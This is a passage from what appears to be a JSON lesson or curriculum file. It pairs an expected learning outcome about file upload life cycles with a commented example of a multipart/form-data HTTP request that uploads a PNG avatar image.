      "expectedOutcome": "Clear grasp of file upload life cycles from browser dispatch to server storage.",
      "codeSnippet": "// HTTP Request Header for File Uploads:\n// POST /api/v1/uploads\n// Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\n//\n// ---------------------------974767299852498929531610575\n// Content-Disposition: form-data; name=\"avatar\"; filename=\"profile.png\"\n// Content-Type: image/png\n//\n// <Binary byte data here...>\n// ---------------------------974767299852498929531610575--"
